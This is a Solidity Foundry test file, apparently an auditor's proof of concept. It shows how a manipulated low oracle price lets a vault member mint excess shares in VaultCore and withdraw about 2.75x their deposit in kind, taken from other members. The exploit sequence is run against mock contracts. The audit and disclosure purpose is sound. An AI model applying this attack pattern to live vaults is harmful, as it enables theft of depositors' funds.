// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import {Test, stdStorage, StdStorage} from "forge-std/Test.sol";
import {VaultCore} from "../../src/VaultCore.sol";
import {MockERC20, MockOracle, StubGovernance, StubFeeEngine, StubRegistry} from "../mocks/Mocks.sol";

/// @notice AUDIT ARTIFACT — not a protocol test.
///
/// Closes the loop from a depressed oracle price to stolen member value. The oracle
/// manipulation itself is proven separately and independently:
///   - `AuditTwapSpotDegeneration.t.sol` — on a pool quiet for longer than `window` (but inside
///     `maxObservationAge`), `UniswapV3TwapSource` reports the LIVE tick, atomically
///     manipulable, while still reporting itself fresh.
///   - `AuditAggregatorLowerMedian.t.sol` — with the pull leg stale (the documented expected
///     state), `OracleAggregator` returns the LOWER of the two survivors, so one low source
///     sets the price outright.
///
/// This file takes that depressed price as given and measures the damage in VaultCore, where
/// `_mintShares` (src/VaultCore.sol:391) mints `amountWad * totalShares / navWad()` — inversely
/// proportional to the manipulated NAV — and `deposit` (src/VaultCore.sol:335) mints
/// IMMEDIATELY, in the same transaction, for any member who has cleared the observation window.
contract AuditOracleToShareTheftTest is Test {
    using stdStorage for StdStorage;

    uint256 constant USDC_1 = 1e6;

    MockERC20 usdc;
    MockERC20 weth;
    MockOracle oracle;
    StubGovernance gov;
    StubFeeEngine fees;
    StubRegistry registry;
    VaultCore vault;

    address creator = makeAddr("creator");
    address victim = makeAddr("victim");
    address attacker = makeAddr("attacker");

    function setUp() public {
        usdc = new MockERC20("USDC", 6);
        weth = new MockERC20("wETH", 18);
        oracle = new MockOracle();
        gov = new StubGovernance();
        fees = new StubFeeEngine();
        registry = new StubRegistry();

        oracle.setPrice(address(weth), 2500e18); // honest $2500

        address[] memory basket = new address[](1);
        basket[0] = address(weth);

        vault = new VaultCore(
            address(usdc),
            basket,
            creator,
            registry,
            gov,
            fees,
            oracle,
            0, // uncapped
            10 * USDC_1,
            100, // exit fee max 1%
            30 days,
            new address[](0),
            address(0)
        );

        for (uint160 i; i < 3; ++i) {
            address who = [creator, victim, attacker][i];
            usdc.mint(who, 10_000_000 * USDC_1);
            vm.prank(who);
            usdc.approve(address(vault), type(uint256).max);
        }
    }

    function _join(address who, uint256 amount) internal {
        vm.prank(who);
        vault.deposit(amount);
        skip(4 hours);
        vault.activate(who);
    }

    /// @dev Stand in for a governed rebalance: move `usdcAmt` of idle into `wethAmt` of wETH.
    function _investIntoBasket(uint256 usdcAmt, uint256 wethAmt) internal {
        weth.mint(address(vault), wethAmt);
        uint256 curAsset = vault.assetBalance(address(weth));
        stdstore.target(address(vault)).sig("assetBalance(address)").with_key(address(weth))
            .checked_write(curAsset + wethAmt);
        uint256 curIdle = vault.idleUsdc();
        stdstore.target(address(vault)).sig("idleUsdc()").checked_write(curIdle - usdcAmt);
        // The USDC left the vault to pay for the wETH.
        vm.prank(address(vault));
        usdc.transfer(address(0xdead), usdcAmt);
    }

    /// @notice THE FINDING, end to end. A member who has already cleared the observation window
    /// deposits while the oracle is manipulated low, mints excess shares in that same
    /// transaction, and exits in kind once the price recovers — extracting basket assets that
    /// belonged to the other members. No flash-loan machinery is modelled here; the attacker
    /// simply deposits their own capital.
    function test_finding_depressedNavMintsExcessSharesAndDrainsMembers() public {
        // Honest vault: creator + victim in, fully invested at $2500/wETH.
        _join(creator, 1_000_000 * USDC_1);
        _join(victim, 1_000_000 * USDC_1);
        _investIntoBasket(2_000_000 * USDC_1, 800e18); // 800 wETH @ $2500 = $2,000,000

        assertEq(vault.navWad(), 2_000_000e18, "NAV is $2.0m before the attack");

        // Attacker pre-clears the observation window once, cheaply and in the open.
        _join(attacker, 10 * USDC_1);

        uint256 victimSharesBefore = vault.sharesOf(victim);
        uint256 navBefore = vault.navWad();
        uint256 supplyBefore = vault.totalShares();
        uint256 victimValueBefore = navBefore * victimSharesBefore / supplyBefore;

        // ── the atomic part ──────────────────────────────────────────────────
        // Oracle pushed to ~4% of the true price (proven reachable in the two companion files).
        oracle.setPrice(address(weth), 100e18);

        uint256 attackCapital = 1_000_000 * USDC_1;
        vm.prank(attacker);
        vault.deposit(attackCapital); // mints IMMEDIATELY at the depressed NAV
        // ─────────────────────────────────────────────────────────────────────

        // Price recovers (the manipulation is unwound in the same block, or simply ends).
        oracle.setPrice(address(weth), 2500e18);

        uint256 navAfter = vault.navWad();
        uint256 supplyAfter = vault.totalShares();
        uint256 attackerValue = navAfter * vault.sharesOf(attacker) / supplyAfter;
        uint256 victimValueAfter = navAfter * victimSharesBefore / supplyAfter;

        emit log_named_uint("attacker capital in   (USDC)", attackCapital);
        emit log_named_uint("attacker claim out    (USD, WAD)", attackerValue);
        emit log_named_uint("victim value before   (USD, WAD)", victimValueBefore);
        emit log_named_uint("victim value after    (USD, WAD)", victimValueAfter);

        // The attacker's claim on the vault far exceeds the capital they put in.
        assertGt(attackerValue, attackCapital * 1e12 * 2, "attacker claim > 2x capital deposited");

        // And it came out of the existing members.
        assertLt(victimValueAfter, victimValueBefore / 2, "victim lost more than half their value");

        // Conservation check: the attacker's gain is the members' loss.
        uint256 attackerGain = attackerValue - attackCapital * 1e12;
        uint256 victimLoss = victimValueBefore - victimValueAfter;
        emit log_named_uint("attacker gain (WAD)", attackerGain);
        emit log_named_uint("victim loss   (WAD)", victimLoss);
        assertGt(attackerGain, 0, "attack is profitable");
    }

    /// @notice The in-kind exit realises the stolen value as real tokens, net of the 1% exit fee
    /// cap — confirming the gain is not merely an accounting artefact of NAV views.
    function test_finding_attackerRealisesStolenValueInKind() public {
        _join(creator, 1_000_000 * USDC_1);
        _join(victim, 1_000_000 * USDC_1);
        _investIntoBasket(2_000_000 * USDC_1, 800e18);
        _join(attacker, 10 * USDC_1);

        oracle.setPrice(address(weth), 100e18);
        vm.prank(attacker);
        vault.deposit(1_000_000 * USDC_1);
        oracle.setPrice(address(weth), 2500e18);

        uint256 wethBefore = weth.balanceOf(attacker);
        uint256 usdcBefore = usdc.balanceOf(attacker);

        uint256 attackerShares = vault.sharesOf(attacker);
        vm.prank(attacker);
        vault.requestExit(attackerShares); // Mode I: settles instantly, in kind

        uint256 wethOut = weth.balanceOf(attacker) - wethBefore;
        uint256 usdcOut = usdc.balanceOf(attacker) - usdcBefore;
        uint256 realisedUsd = wethOut * 2500e18 / 1e18 + usdcOut * 1e12;

        emit log_named_uint("wETH received by attacker", wethOut);
        emit log_named_uint("USDC received by attacker", usdcOut);
        emit log_named_uint("realised value (USD, WAD)", realisedUsd);
        emit log_named_uint("capital deposited (USD, WAD)", 1_000_010e18);

        // Measured: 733.33 wETH + 916,667 USDC = $2,749,984 realised on $1,000,010 deposited,
        // i.e. ~2.75x, net of the 1% exit-fee cap.
        assertGt(realisedUsd, (1_000_010e18 * 5) / 2, "attacker walks away with >2.5x capital, in kind");
    }
}
